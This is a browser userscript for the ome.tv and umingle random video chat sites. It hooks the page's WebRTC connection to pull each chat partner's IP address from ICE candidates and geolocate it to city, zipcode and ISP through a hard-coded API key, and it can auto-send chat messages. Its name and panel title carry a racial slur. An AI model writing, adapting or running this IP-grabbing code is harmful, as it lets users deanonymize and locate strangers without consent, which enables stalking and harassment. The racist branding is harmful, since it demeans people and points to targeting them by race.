// ==UserScript==
// @name         nigga sniffer
// @namespace    http://tampermonkey.net/
// @license      we love trump
// @match        https://ome.tv/*
// @match        https://ometv.chat/*
// @match        https://umingle.com/*
// @grant        none
// @version      2.1
// @author       levifrsn
// @description  nigga Finder tool for ome.tv with ip pulling and geolocation
// @downloadURL https://update.greasyfork.org/scripts/563678/nigga%20sniffer.user.js
// @updateURL https://update.greasyfork.org/scripts/563678/nigga%20sniffer.meta.js
// ==/UserScript==

(function () {
    "use strict";

    // ========================================
    // CONFIG & STATE
    // ========================================
    const defaultConfig = {
        ipLookupEnabled: true,
        autoOpen: true,
        menuVisible: true,
        x: 20,
        y: 20,
        autoChatEnabled: false,
        autoChatMessage: "Hello!",
        language: "en", // Default language
    };

    let config = { ...defaultConfig };
    const saved = localStorage.getItem("ipgeo_config");
    if (saved) {
        try {
            config = { ...config, ...JSON.parse(saved) };
        } catch (e) {}
    }

    function save() {
        localStorage.setItem("ipgeo_config", JSON.stringify(config));
    }

    const state = {
        ipDataCache: null,
        fetchInProgress: false,
        activeTab: "Info",
        lastPartnerId: null
    };

    const translations = {
        en: {
            info: "Info",
            automation: "Automation",
            settings: "Settings",
            ip_address: "IP Address",
            country: "Country",
            state_prov: "State/Prov",
            city: "City",
            zipcode: "Zipcode",
            currency: "Currency",
            calling_code: "Calling Code",
            isp: "Service Provider",
            searching: "Searching for peer...",
            security_alert: "Security Alert",
            masked: "Masked Connection",
            enable_ip: "Enable IP Lookup",
            enable_chat: "Enable Auto-Chat",
            chat_msg: "Message",
            lang_label: "Language",
            created_by: "Created by levifrsn on GitHub and GreasyFork"
        },
        es: {
            info: "Info",
            automation: "Automatización",
            settings: "Ajustes",
            ip_address: "Dirección IP",
            country: "País",
            state_prov: "Estado/Prov",
            city: "Ciudad",
            zipcode: "Código Postal",
            currency: "Moneda",
            calling_code: "Código de Llamada",
            isp: "Proveedor de Internet",
            searching: "Buscando par...",
            security_alert: "Alerta de Seguridad",
            masked: "Conexión Enmascarada",
            enable_ip: "Activar Búsqueda IP",
            enable_chat: "Activar Auto-Chat",
            chat_msg: "Mensaje",
            lang_label: "Idioma",
            created_by: "Creado por levifrsn en GitHub y GreasyFork"
        },
        fr: {
            info: "Info",
            automation: "Automatisation",
            settings: "Paramètres",
            ip_address: "Adresse IP",
            country: "Pays",
            state_prov: "État/Prov",
            city: "Ville",
            zipcode: "Code Postal",
            currency: "Devise",
            calling_code: "Code d'appel",
            isp: "Fournisseur d'accès",
            searching: "Recherche de pair...",
            security_alert: "Alerte de Sécurité",
            masked: "Connexion Masquée",
            enable_ip: "Activer la recherche IP",
            enable_chat: "Activer l'Auto-Chat",
            chat_msg: "Message",
            lang_label: "Langue",
            created_by: "Créé par levifrsn sur GitHub et GreasyFork"
        },
        de: {
            info: "Info",
            automation: "Automatisierung",
            settings: "Einstellungen",
            ip_address: "IP-Adresse",
            country: "Land",
            state_prov: "Bundesland",
            city: "Stadt",
            zipcode: "Postleitzahl",
            currency: "Währung",
            calling_code: "Vorwahl",
            isp: "Internetanbieter",
            searching: "Suche nach Partner...",
            security_alert: "Sicherheitswarnung",
            masked: "Maskierte Verbindung",
            enable_ip: "IP-Suche aktivieren",
            enable_chat: "Auto-Chat aktivieren",
            chat_msg: "Nachricht",
            lang_label: "Sprache",
            created_by: "Erstellt von levifrsn auf GitHub und GreasyFork"
        }
    };

    const t = (key) => translations[config.language][key] || key;

    const CONSTANTS = {
        API_TOKEN: "23a71a07dfaf407bac47c9cff4784e2d",
        API_BASE_URL: "https://api.ipgeolocation.io/v2/ipgeo",
    };

    // ========================================
    // UI SYSTEM (MODERN DARK STYLE)
    // ========================================
    let mainPanel, contentArea, tabBar, toggleBtn, titleBar;

    function createUI() {
        if (document.getElementById("ipinfo-ui")) return;

        // Toggle Button
        toggleBtn = document.createElement("div");
        toggleBtn.id = "ipinfo-toggle";
        Object.assign(toggleBtn.style, {
            position: "fixed",
            right: "0px",
            top: "50%",
            transform: "translateY(-50%)",
            width: "30px",
            height: "120px",
            background: "#232323",
            border: "1px solid #3a3a3a",
            borderRight: "none",
            borderRadius: "5px 0 0 5px",
            cursor: "pointer",
            zIndex: 100000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            writingMode: "vertical-rl",
            fontSize: "12px",
            fontFamily: "Consolas, monospace",
            color: "#888",
            boxShadow: "-2px 0 5px rgba(0,0,0,0.3)"
        });
        toggleBtn.textContent = "DEBUG TOOL";
        toggleBtn.onclick = () => {
            config.menuVisible = !config.menuVisible;
            mainPanel.style.display = config.menuVisible ? "block" : "none";
            save();
        };
        document.body.appendChild(toggleBtn);

        // Main Panel
        mainPanel = document.createElement("div");
        mainPanel.id = "ipinfo-ui";
        Object.assign(mainPanel.style, {
            position: "fixed",
            top: config.y + "px",
            left: config.x + "px",
            width: "320px",
            background: "#2b2b2b",
            color: "#f1f1f1",
            fontFamily: 'Consolas, monospace',
            zIndex: 99999,
            border: "1px solid #3a3a3a",
            padding: "0px",
            userSelect: "none",
            boxShadow: "0 4px 15px rgba(0,0,0,0.5)",
            display: config.menuVisible ? "block" : "none",
        });
        document.body.appendChild(mainPanel);

        // Title Bar
        titleBar = document.createElement("div");
        Object.assign(titleBar.style, {
            background: "#1e1e1e",
            color: "#fff",
            padding: "8px 12px",
            fontSize: "13px",
            fontWeight: "bold",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            cursor: "move",
            borderBottom: "1px solid #3a3a3a"
        });
        titleBar.innerHTML = "<span>nigga FINDER</span>";

        const closeX = document.createElement("div");
        closeX.textContent = "×";
        Object.assign(closeX.style, {
            cursor: "pointer",
            fontSize: "18px",
            lineHeight: "1"
        });
        closeX.onclick = () => {
            config.menuVisible = false;
            mainPanel.style.display = "none";
            save();
        };
        titleBar.appendChild(closeX);
        mainPanel.appendChild(titleBar);

        tabBar = document.createElement("div");
        Object.assign(tabBar.style, {
            display: "flex",
            borderBottom: "1px solid #3a3a3a",
            background: "#232323",
        });
        mainPanel.appendChild(tabBar);

        renderTabs();

        contentArea = document.createElement("div");
        Object.assign(contentArea.style, {
            padding: "15px",
            fontSize: "12px",
            maxHeight: "450px",
            overflowY: "auto",
        });
        mainPanel.appendChild(contentArea);

        renderContent();
        makeDraggable(titleBar);
    }

    function renderTabs() {
        tabBar.innerHTML = "";
        ["Info", "Automation", "Settings"].forEach((name) => {
            const btn = document.createElement("div");
            btn.textContent = t(name.toLowerCase());
            Object.assign(btn.style, {
                flex: "1",
                padding: "10px 0",
                textAlign: "center",
                cursor: "pointer",
                background: name === state.activeTab ? "#2b2b2b" : "#232323",
                color: name === state.activeTab ? "#ddd" : "#888",
                fontSize: "12px",
                transition: "all 0.2s"
            });
            btn.onclick = (e) => {
                e.stopPropagation();
                state.activeTab = name;
                renderContent();
                updateTabStyles();
            };
            tabBar.appendChild(btn);
        });
    }

    function updateTabStyles() {
        Array.from(tabBar.children).forEach((c, i) => {
            const name = ["Info", "Automation", "Settings"][i];
            const isActive = name === state.activeTab;
            c.style.background = isActive ? "#2b2b2b" : "#232323";
            c.style.color = isActive ? "#ddd" : "#888";
        });
    }

    function renderContent() {
        contentArea.innerHTML = "";

        if (state.activeTab === "Info") {
            if (!state.ipDataCache) {
                contentArea.innerHTML = `<div style='padding:20px;text-align:center;color:#666'>${t('searching')}</div>`;
                return;
            }
            const data = state.ipDataCache;
            const loc = data.location || {};
            const fields = [
                { label: t('ip_address'), val: data.ip },
                { label: t('isp'), val: data.isp },
                { label: t('country'), val: loc.country_name + (loc.country_emoji ? " " + loc.country_emoji : "") },
                { label: t('state_prov'), val: loc.state_prov },
                { label: t('city'), val: loc.city },
                { label: t('zipcode'), val: loc.zipcode },
                { label: t('currency'), val: data.currency ? `${data.currency.name} (${data.currency.symbol})` : null },
                { label: t('calling_code'), val: data.country_metadata ? data.country_metadata.calling_code : null }
            ];

            fields.forEach(f => {
                if (!f.val) return;
                const row = document.createElement("div");
                Object.assign(row.style, {
                    display: "flex",
                    justifyContent: "space-between",
                    padding: "6px 0",
                    borderBottom: "1px solid #333",
                });
                row.innerHTML = `<span style='color:#888'>${f.label}</span> <span style='color:#ddd'>${f.val}</span>`;
                contentArea.appendChild(row);
            });

            if (loc.country_flag) {
                const flagContainer = document.createElement("div");
                Object.assign(flagContainer.style, {
                    marginTop: "15px",
                    textAlign: "center"
                });
                flagContainer.innerHTML = `<img src="${loc.country_flag}" style="border:1px solid #3a3a3a; border-radius:3px; opacity:0.8" height="32">`;
                contentArea.appendChild(flagContainer);
            }

            const footer = document.createElement("div");
            Object.assign(footer.style, {
                marginTop: "20px",
                paddingTop: "10px",
                borderTop: "1px solid #333",
                fontSize: "10px",
                color: "#555",
                textAlign: "center"
            });
            footer.innerHTML = t('created_by');
            contentArea.appendChild(footer);
        } else if (state.activeTab === "Automation") {
            addToggle(t('enable_chat'), "autoChatEnabled");
            addTextInput(t('chat_msg'), "autoChatMessage");
        } else if (state.activeTab === "Settings") {
            addToggle(t('enable_ip'), "ipLookupEnabled");

            // Language Selector
            const langRow = document.createElement("div");
            Object.assign(langRow.style, {
                marginBottom: "12px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between"
            });
            langRow.innerHTML = `<span style="color:#888">${t('lang_label')}</span>`;

            const select = document.createElement("select");
            Object.assign(select.style, {
                background: "#232323",
                color: "#ddd",
                border: "1px solid #3a3a3a",
                fontSize: "11px",
                padding: "2px 5px",
                fontFamily: "inherit"
            });

            ["en", "es", "fr", "de"].forEach(lang => {
                const opt = document.createElement("option");
                opt.value = lang;
                opt.textContent = lang.toUpperCase();
                opt.selected = config.language === lang;
                select.appendChild(opt);
            });

            select.onchange = () => {
                config.language = select.value;
                save();
                renderTabs();
                renderContent();
            };
            langRow.appendChild(select);
            contentArea.appendChild(langRow);
        }
    }

    function addToggle(label, key) {
        const row = document.createElement("div");
        Object.assign(row.style, {
            marginBottom: "12px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between"
        });
        row.innerHTML = `<span style="color:#888">${label}</span>`;

        const checkbox = document.createElement("input");
        checkbox.type = "checkbox";
        checkbox.checked = config[key];
        checkbox.style.accentColor = "#3645B5";
        checkbox.onchange = () => {
            config[key] = checkbox.checked;
            save();
        };
        row.appendChild(checkbox);
        contentArea.appendChild(row);
    }

    function addTextInput(label, key) {
        const row = document.createElement("div");
        Object.assign(row.style, {
            marginBottom: "12px",
            display: "flex",
            flexDirection: "column",
            gap: "5px"
        });
        row.innerHTML = `<span style="color:#888">${label}</span>`;

        const input = document.createElement("input");
        input.type = "text";
        input.value = config[key];
        Object.assign(input.style, {
            background: "#232323",
            color: "#ddd",
            border: "1px solid #3a3a3a",
            padding: "5px",
            fontSize: "11px",
            fontFamily: "inherit",
            borderRadius: "3px"
        });
        input.oninput = () => {
            config[key] = input.value;
            save();
        };
        row.appendChild(input);
        contentArea.appendChild(row);
    }

    function makeDraggable(handle) {
        let isDragging = false;
        let offsetX, offsetY;

        handle.addEventListener('mousedown', (e) => {
            if (e.target.tagName === 'DIV' || e.target.tagName === 'SPAN') {
                isDragging = true;
                offsetX = e.clientX - mainPanel.offsetLeft;
                offsetY = e.clientY - mainPanel.offsetTop;
                e.preventDefault();
            }
        });

        window.addEventListener('mousemove', (e) => {
            if (isDragging) {
                const x = e.clientX - offsetX;
                const y = e.clientY - offsetY;
                mainPanel.style.left = x + "px";
                mainPanel.style.top = y + "px";
                config.x = x;
                config.y = y;
                save();
            }
        });

        window.addEventListener('mouseup', () => isDragging = false);
    }

    // ========================================
    // CHAT AUTOMATION
    // ========================================
    function sendChatMessage(msg) {
        const selectors = ['.chat-input textarea', '#chat-input', '.textarea-container textarea', '.chat-box textarea'];
        const btnSelectors = ['.chat-input .send-btn', '.send-button', '.chat-box .send', 'button.send'];

        let textarea = null;
        for (const s of selectors) {
            textarea = document.querySelector(s);
            if (textarea) break;
        }

        let sendBtn = null;
        for (const s of btnSelectors) {
            sendBtn = document.querySelector(s);
            if (sendBtn) break;
        }

        if (textarea && sendBtn) {
            textarea.value = msg;
            textarea.dispatchEvent(new Event('input', { bubbles: true }));
            textarea.dispatchEvent(new Event('change', { bubbles: true }));

            setTimeout(() => {
                sendBtn.click();
                const enterEvent = new KeyboardEvent('keydown', {
                    bubbles: true, cancelable: true, keyCode: 13, key: 'Enter'
                });
                textarea.dispatchEvent(enterEvent);
            }, 200);
        }
    }

    function detectNewPartner() {
        const videoElement = document.querySelector('video[src]');
        if (videoElement) {
            const currentId = videoElement.getAttribute('src');
            if (currentId && currentId !== state.lastPartnerId) {
                state.lastPartnerId = currentId;
                // Reset cache when meeting new partner if lookup is enabled
                if (config.ipLookupEnabled) {
                    state.ipDataCache = null;
                    if (state.activeTab === "Info") renderContent();
                }
                if (config.autoChatEnabled && config.autoChatMessage) {
                    setTimeout(() => {
                        sendChatMessage(config.autoChatMessage);
                    }, 2000);
                }
            }
        }
    }

    // ========================================
    // LOGIC
    // ========================================
    async function fetchIPInfo(ip = null) {
        if (!config.ipLookupEnabled) return;
        if (state.fetchInProgress) return;
        state.fetchInProgress = true;

        try {
            const url = `${CONSTANTS.API_BASE_URL}?apiKey=${CONSTANTS.API_TOKEN}${ip ? "&ip=" + ip : ""}`;
            const response = await fetch(url);
            const data = await response.json();

            state.ipDataCache = data;
            if (mainPanel) renderContent();
        } catch (e) {
            console.error(e);
        } finally {
            state.fetchInProgress = false;
        }
    }

    function patchRTC() {
        const OriginalRTC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (!OriginalRTC) return;

        const NewRTC = function (...args) {
            const pc = new OriginalRTC(...args);
            const originalAdd = pc.addIceCandidate?.bind(pc);
            if (originalAdd) {
                pc.addIceCandidate = function (candidate, ...rest) {
                    try {
                        const cand = candidate?.candidate || candidate;
                        if (typeof cand === 'string' && cand.includes("srflx")) {
                            const parts = cand.split(" ");
                            if (parts.length >= 5) {
                                const ip = parts[4];
                                if (ip) fetchIPInfo(ip);
                            }
                        }
                    } catch (err) {}
                    return originalAdd(candidate, ...rest);
                };
            }
            return pc;
        };

        NewRTC.prototype = OriginalRTC.prototype;
        try {
            Object.keys(OriginalRTC).forEach(key => {
                NewRTC[key] = OriginalRTC[key];
            });
        } catch (e) {}

        window.RTCPeerConnection = NewRTC;
        if (window.webkitRTCPeerConnection) window.webkitRTCPeerConnection = NewRTC;
        if (window.mozRTCPeerConnection) window.mozRTCPeerConnection = NewRTC;
    }

    function init() {
        patchRTC();
        createUI();
        setInterval(detectNewPartner, 2000);

        window.addEventListener("keydown", (e) => {
            if (e.key === "Insert") {
                config.menuVisible = !config.menuVisible;
                mainPanel.style.display = config.menuVisible ? "block" : "none";
                save();
            }
        });
    }

    if (document.readyState === "complete") init();
    else window.addEventListener("load", init);
})();
